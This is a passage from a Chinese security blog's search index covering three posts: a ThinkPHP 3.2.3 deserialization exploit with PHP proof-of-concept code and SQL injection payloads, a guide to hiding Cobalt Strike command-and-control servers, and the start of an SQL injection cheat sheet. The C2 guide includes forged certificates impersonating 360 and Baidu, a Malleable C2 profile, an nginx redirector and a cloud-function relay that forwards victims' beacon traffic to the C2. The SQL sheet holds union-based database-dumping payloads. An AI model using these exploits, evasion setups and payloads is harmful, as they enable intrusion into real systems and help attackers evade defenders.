class=\"string\">'id'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $options   = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $data = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $db = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;db = <span class=\"keyword\">new</span> Mysql();</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;options[<span class=\"string\">'where'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;data[<span class=\"keyword\">$this</span>-&gt;pk] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">                <span class=\"string\">\"table\"</span> =&gt; <span class=\"string\">\"mysql.user where 1=updatexml(1,user(),1)#\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"where\"</span> =&gt; <span class=\"string\">\"1=1\"</span></span><br><span class=\"line\">            );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Think</span>\\<span class=\"title\">Db</span>\\<span class=\"title\">Driver</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">use</span> <span class=\"title\">PDO</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $options = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class=\"keyword\">true</span>    <span class=\"comment\">// 开启才能读取文件</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $config = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">            <span class=\"string\">'type'</span>           =&gt; <span class=\"string\">'mysql'</span>, <span class=\"comment\">// 数据库类型</span></span><br><span class=\"line\">            <span class=\"string\">'hostname'</span>       =&gt; <span class=\"string\">'127.0.0.1'</span>, <span class=\"comment\">// 服务器地址</span></span><br><span class=\"line\">            <span class=\"string\">'database'</span>       =&gt; <span class=\"string\">'tp3'</span>, <span class=\"comment\">// 数据库名</span></span><br><span class=\"line\">            <span class=\"string\">'username'</span>       =&gt; <span class=\"string\">'root'</span>, <span class=\"comment\">// 用户名</span></span><br><span class=\"line\">            <span class=\"string\">'password'</span>       =&gt; <span class=\"string\">'root'</span>, <span class=\"comment\">// 密码</span></span><br><span class=\"line\">            <span class=\"string\">'hostport'</span>       =&gt; <span class=\"string\">'3307'</span>, <span class=\"comment\">// 端口</span></span><br><span class=\"line\">            <span class=\"string\">'dsn'</span>            =&gt; <span class=\"string\">''</span>, <span class=\"comment\">//</span></span><br><span class=\"line\">            <span class=\"string\">'params'</span>         =&gt; <span class=\"keyword\">array</span>(), <span class=\"comment\">// 数据库连接参数</span></span><br><span class=\"line\">            <span class=\"string\">'charset'</span>        =&gt; <span class=\"string\">'utf8'</span>, <span class=\"comment\">// 数据库编码默认采用utf8</span></span><br><span class=\"line\">            <span class=\"string\">'prefix'</span>         =&gt; <span class=\"string\">''</span>, <span class=\"comment\">// 数据库表前缀</span></span><br><span class=\"line\">            <span class=\"string\">'debug'</span>          =&gt; <span class=\"keyword\">false</span>, <span class=\"comment\">// 数据库调试模式</span></span><br><span class=\"line\">            <span class=\"string\">'deploy'</span>         =&gt; <span class=\"number\">0</span>, <span class=\"comment\">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span></span><br><span class=\"line\">            <span class=\"string\">'rw_separate'</span>    =&gt; <span class=\"keyword\">false</span>, <span class=\"comment\">// 数据库读写是否分离 主从式有效</span></span><br><span class=\"line\">            <span class=\"string\">'master_num'</span>     =&gt; <span class=\"number\">1</span>, <span class=\"comment\">// 读写分离后 主服务器数量</span></span><br><span class=\"line\">            <span class=\"string\">'slave_no'</span>       =&gt; <span class=\"string\">''</span>, <span class=\"comment\">// 指定从服务器序号</span></span><br><span class=\"line\">            <span class=\"string\">'db_like_fields'</span> =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> &#123;</span><br><span class=\"line\">    <span class=\"title\">echo</span> <span class=\"title\">base64_encode</span>(<span class=\"title\">serialize</span>(<span class=\"title\">new</span> <span class=\"title\">Think</span>\\<span class=\"title\">Image</span>\\<span class=\"title\">Driver</span>\\<span class=\"title\">Imagick</span>()));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210811144853275.png\" alt=\"image-20210811144853275\"></p>\n<p>使用python2启动恶意MySQL服务脚本</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210811145005187.png\" alt=\"image-20210811145005187\"></p>\n<p>前往漏洞测试页面进行发包</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210811145040218.png\" alt=\"image-20210811145040218\"></p>\n<p><img src=\"F:%5CBlog%5CNotes%5Cimg%5Cimage-20210811145434488.png\" alt=\"image-20210811145434488\"></p>\n<p>然后更改POC中的数据库信息为目标数据库，更改<code>table</code>字段对数据库进行注入：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Think</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">use</span> <span class=\"title\">Think</span>\\<span class=\"title\">Db</span>\\<span class=\"title\">Driver</span>\\<span class=\"title\">Mysql</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $pk = <span class=\"string\">'id'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $options   = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $data = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $db = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;db = <span class=\"keyword\">new</span> Mysql();</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;options[<span class=\"string\">'where'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;data[<span class=\"keyword\">$this</span>-&gt;pk] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">                <span class=\"string\">\"table\"</span> =&gt; <span class=\"string\">\"mysql.user where 1=updatexml(0x7e,user(),0x7)#\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"where\"</span> =&gt; <span class=\"string\">\"1=1\"</span></span><br><span class=\"line\">            );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>这条pop链，在<code>\\ThinkPHP\\Library\\Think\\Model.class.php::connect()</code>方法中，可以通过对<code>$this-&gt;config</code>的控制，来进行任意的数据库连接。而在<code>\\ThinkPHP\\Library\\Think\\Model.class.php::execute()</code>方法中，通过对<code>$sql</code>的控制，进而对目标数据库进行注入。且<strong>TP3.2.3采用的是PDO连接</strong>，而PDO默认支持多语句查询，所以可以通过堆叠注入，进行日志getshell。</p>\n","categories":["漏洞复现"],"tags":["代码审计","Thinkphp"]},{"title":"C2隐藏","url":"http://yoursite.com/2021/07/21/C2隐藏/","content":"<h2 id=\"修改默认端口：\"><a href=\"#修改默认端口：\" class=\"headerlink\" title=\"修改默认端口：\"></a>修改默认端口：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim teamserver</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"更换证书\"><a href=\"#更换证书\" class=\"headerlink\" title=\"更换证书\"></a>更换证书</h2><p>在第一次运行CS之后会在当前目录下生成证书文件：<code>cobaltstrike.store</code>。</p>\n<p>该文件可以利用<code>keytool</code>工具进行查看。</p>\n<blockquote>\n<p>Keytool是一个Java数据证书的管理工具，Keytool将密钥和证书存在一个称为keystore的文件中，即<code>*.store</code></p>\n</blockquote>\n<p>CS的默认证书具有很明显的特征：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure>\n\n<p>直接写着你就是CS服务器，这种肯定要被打</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210811203728362.png\" alt=\"image-20210811203728362\"></p>\n<p>使用一下命令对证书进行伪造：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">360：</span><br><span class=\"line\">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN=US, OU=360.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">baidu：</span><br><span class=\"line\">keytool -keystore cobaltStrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN=ZhongGuo, OU=CC, O=CCSEC, L=BeiJing, ST=ChaoYang, C=CN&quot;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Malleable-C2混淆流量\"><a href=\"#Malleable-C2混淆流量\" class=\"headerlink\" title=\"Malleable C2混淆流量\"></a>Malleable C2混淆流量</h3><p>项目地址：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/threatexpress/malleable-c2</span><br><span class=\"line\">https://github.com/xx0hcd/Malleable-C2-Profiles/tree/master/normal</span><br></pre></td></tr></table></figure>\n\n<p>通过CS自带的<code>c2lint</code>检查配置是否可用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./c2lint malleable-c2/jquery-c2.4.2.profile</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202112.png\" alt></p>\n<p>如图所示，配置可用。之后启动teamserver，命令如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./teamserver ip password ./malleable-c2/jquery-c2.4.2.profile</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Nginx反向代理\"><a href=\"#Nginx反向代理\" class=\"headerlink\" title=\"Nginx反向代理\"></a>Nginx反向代理</h2><p>通过配置Nginx，将信标流量给CS服务器</p>\n<h3 id=\"修改nginx配置文件\"><a href=\"#修改nginx配置文件\" class=\"headerlink\" title=\"修改nginx配置文件\"></a>修改nginx配置文件</h3><p>这里我们选择<code>jquery-c2.4.2.profile</code>对流量进行伪装，通过查看该文件，可以看到流量会通过伪装的uri来进行通信</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818180640440.png\" alt=\"image-20210818180640440\"></p>\n<p>所以在nginx配置文件中，对<code>jquery</code>开头的url进行匹配，并反向代理。匹配成功后发送给cs所监听的端口</p>\n<pre><code>location ~*/jquery{\n        #start with jquery\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #获取真实IP\n        proxy_pass http://127.0.0.1:11700;\n}</code></pre><p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202144.png\" alt></p>\n<blockquote>\n<p>可能会存在nginx配置文件和图中的不同，在网上找一个配置文件替换掉之前的即可</p>\n</blockquote>\n<p>配置文件中通过<code>X-Forwarded-For</code>，来获取真实IP。如果没有这段代码，所获得的外部地址皆为<code>127.0.0.1</code></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202221.png\" alt></p>\n<h3 id=\"配置C2监听器\"><a href=\"#配置C2监听器\" class=\"headerlink\" title=\"配置C2监听器\"></a>配置C2监听器</h3><p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202304.png\" alt></p>\n<p>C2端口为nginx<strong>服务</strong>端口，Bind端口为nginx<strong>代理</strong>端口</p>\n<p>上马测试：</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829205107.png\" alt></p>\n<h3 id=\"防火墙配置\"><a href=\"#防火墙配置\" class=\"headerlink\" title=\"防火墙配置\"></a>防火墙配置</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iptables -A INPUT -s 127.0.0.1 -p tcp --dport 11700 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -p tcp --dport 11700 -j DROP</span><br></pre></td></tr></table></figure>\n\n<p>通过iptables，只允许<code>127.0.0.1</code>，访问该端口。也可以通过云服务器后台关闭端口的进流量</p>\n<h2 id=\"云函数（python3-6）\"><a href=\"#云函数（python3-6）\" class=\"headerlink\" title=\"云函数（python3.6）\"></a>云函数（python3.6）</h2><p>流程：创建基本函数 -&gt; 配置触发器 -&gt; 配置API路径 -&gt; 配置C2</p>\n<ol>\n<li><p>创建基本函数</p>\n<p>函数内容不用管，确保函数能够正常访问之后再更改代码</p>\n</li>\n</ol>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210812212211166.png\" alt=\"image-20210812212211166\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829210615.png\" alt></p>\n<ol start=\"2\">\n<li><p>配置触发器</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214106.png\" alt></p>\n<p>完成之后，在云函数管理中能找到一个API路径，将云函数发布之后，访问该路径</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214132.png\" alt></p>\n<p>访问记录都可以在左侧的日志中看到。确定能访问到云函数之后，更改云函数代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#中转代码：</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> json,requests,base64</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main_handler</span><span class=\"params\">(event, context)</span>:</span></span><br><span class=\"line\">    C2=<span class=\"string\">'http://&lt;C2服务器地址&gt;'</span> <span class=\"comment\"># 这里可以使用 HTTP、HTTPS~下角标~，也不用加端口</span></span><br><span class=\"line\">    path=event[<span class=\"string\">'path'</span>]</span><br><span class=\"line\">    headers=event[<span class=\"string\">'headers'</span>]</span><br><span class=\"line\">    print(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event[<span class=\"string\">'httpMethod'</span>] == <span class=\"string\">'GET'</span> :</span><br><span class=\"line\">        resp=requests.get(C2+path,headers=headers,verify=<span class=\"literal\">False</span>) </span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        resp=requests.post(C2+path,data=event[<span class=\"string\">'body'</span>],headers=headers,verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        print(resp.headers)</span><br><span class=\"line\">        print(resp.content)</span><br><span class=\"line\">    </span><br><span class=\"line\">    response=&#123;</span><br><span class=\"line\">        <span class=\"string\">\"isBase64Encoded\"</span>: <span class=\"literal\">True</span>,</span><br><span class=\"line\">        <span class=\"string\">\"statusCode\"</span>: resp.status_code,</span><br><span class=\"line\">        <span class=\"string\">\"headers\"</span>: dict(resp.headers),</span><br><span class=\"line\">        <span class=\"string\">\"body\"</span>: str(base64.b64encode(resp.content))[<span class=\"number\">2</span>:<span class=\"number\">-1</span>]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response</span><br></pre></td></tr></table></figure>\n\n<p>对函数更改后要进行新发布，只保存不发布，不能正常使用</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214453.png\" alt></p>\n<p>回到触发器中，删除之前创建的触发器，重新创建触发器，勾选集成响应，配置如图，</p>\n</li>\n</ol>\n<ol start=\"3\">\n<li><p>配置API路径</p>\n<p>接着在配置API网关的默认路径，完成配置后并发布。</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214637.png\" alt></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214755.png\" alt></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214655.png\" alt></p>\n</li>\n<li><p>配置C2</p>\n<p>启动C2服务器的时候加上profile文件，不加这个文件在选择Listener的时候似乎会出现bug</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set sample_name &quot;Aruk4s&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">set sleeptime &quot;3000&quot;;</span><br><span class=\"line\">set jitter    &quot;0&quot;;</span><br><span class=\"line\">set maxdns    &quot;255&quot;;</span><br><span class=\"line\">set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">http-get &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    set uri &quot;/api/getit&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    client &#123;</span><br><span class=\"line\">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class=\"line\">        metadata &#123;</span><br><span class=\"line\">            base64;</span><br><span class=\"line\">            prepend &quot;SESSIONID=&quot;;</span><br><span class=\"line\">            header &quot;Cookie&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class=\"line\">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class=\"line\">        header &quot;Server&quot; &quot;Nodejs&quot;;</span><br><span class=\"line\">        output &#123;</span><br><span class=\"line\">            base64;</span><br><span class=\"line\">            print;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">http-stager &#123;  </span><br><span class=\"line\">    set uri_x86 &quot;/vue.min.js&quot;;</span><br><span class=\"line\">    set uri_x64 &quot;/bootstrap-2.min.js&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">http-post &#123;</span><br><span class=\"line\">    set uri &quot;/api/postit&quot;;</span><br><span class=\"line\">    client &#123;</span><br><span class=\"line\">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class=\"line\">        id &#123;</span><br><span class=\"line\">            base64;</span><br><span class=\"line\">            prepend &quot;JSESSION=&quot;;</span><br><span class=\"line\">            header &quot;Cookie&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        output &#123;</span><br><span class=\"line\">            base64;</span><br><span class=\"line\">            print;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class=\"line\">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class=\"line\">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class=\"line\">        output &#123;</span><br><span class=\"line\">            base64;</span><br><span class=\"line\">            print;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>创建一个监听，在监听中填入云函数的公网地址</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210815202308487.png\" alt=\"image-20210815202308487\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210815202346717.png\" alt=\"image-20210815202346717\"></p>\n<p>打开C2的Web Log，访问云函数链接，可以看到有返回值，说明配置成功</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210815202749116.png\" alt=\"image-20210815202749116\"></p>\n</li>\n</ol>\n<h3 id=\"关于IP\"><a href=\"#关于IP\" class=\"headerlink\" title=\"关于IP\"></a>关于IP</h3><p>因为是利用云函数的问题，IP会经过CDN，所以IP会经常变换。且上限的机器外网IP全部都是腾讯云。</p>\n<p>我们可以通过curl命令来查看真实IP</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl ident.me</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>云函数可以看做一个中转站。首先木马在受害者电脑运行后，将回连流量发送到云函数API触发器所在地址，通过云函数所设置的API触发器，从而调用云函数，而通过配置云函数，起到把流量再转发给C2服务器，从而使受害者上线。即：</p>\n<blockquote>\n<p>受害者 -&gt; API触发器 -&gt; 云函数 -&gt; C2服务器</p>\n</blockquote>\n","categories":["Summary"],"tags":["Red"]},{"title":"SQL注入总结","url":"http://yoursite.com/2020/11/04/SQL注入/","content":"<h1 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h1><h2 id=\"一、联合注入：\"><a href=\"#一、联合注入：\" class=\"headerlink\" title=\"一、联合注入：\"></a>一、联合注入：</h2><h3 id=\"常用函数：\"><a href=\"#常用函数：\" class=\"headerlink\" title=\"常用函数：\"></a>常用函数：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">group_concat：以逗号连接查询出来的数据</span><br><span class=\"line\">limit: limit 0,1 //从第一行往后查1行。第一个数代表从第n+1行开始，第二个数代表往后几行。</span><br><span class=\"line\">information_schema：保存了MySQL数据库服务器中所有的数据库的信息</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Payload：\"><a href=\"#Payload：\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库：1&apos; union select group_concat(schema_name) from information_schema.schemata#</span><br><span class=\"line\">爆表：1&apos; union select group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class=\"line\">爆列：1&apos; union select group_concat(column_name) from information_schema.columns where table_name = &apos;表&apos;</span><br><span class=\"line\">爆字段：1&apos; union select 列名 from 表名</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、报错注入：\"><a href=\"#二、报错注入：\" class=\"headerlink\" title=\"二、报错注入：\"></a>二、报错注入：</h2><h3 id=\"1-Floor：\"><a href=\"#1-Floor：\" class=\"headerlink\" title=\"1.Floor：\"></a>1.Floor：</h3><h4 id=\"原理：\"><a href=\"#原理：\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><ol>\n<li><p>查询前默认会建立空的虚拟表。</p>\n</li>\n<li><p>取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕。</p>\n</li>\n<li><p>查询第二条记录，再次计算floor(rand(0)<em>2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)\\</em>2)不会被计算第二次，直接count()加1，第二条记录查询完毕。</p>\n</li>\n<li><p>查询第三条记录，再次计算floor(rand(0)<em>2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据（存入的动作已经发生），在插入数据时floor(rand(0)\\</em>2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</p>\n</li>\n<li><p>整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p>\n</li>\n<li><p>在floor(rand(1)<em>2)等floor(rand(x)*2)中，在虚表中会把0，1作为键值存入，所以后面不管查询到多少数据，只会增加count(\\</em>)的字段数量，而不会报错</p>\n<p>成功报错：</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201112185417.png\" alt></p>\n<p>失败：</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201112185437.png\" alt></p>\n</li>\n</ol>\n<h4 id=\"使用函数\"><a href=\"#使用函数\" class=\"headerlink\" title=\"使用函数:\"></a>使用函数:</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rand()：取0-1之间的随机浮点数值</span><br><span class=\"line\">rand(x)：每个rand(x)代表一个固定随机数</span><br><span class=\"line\">floor(x)：返回X值的最大整数值，但是不能大于X，向下取整</span><br><span 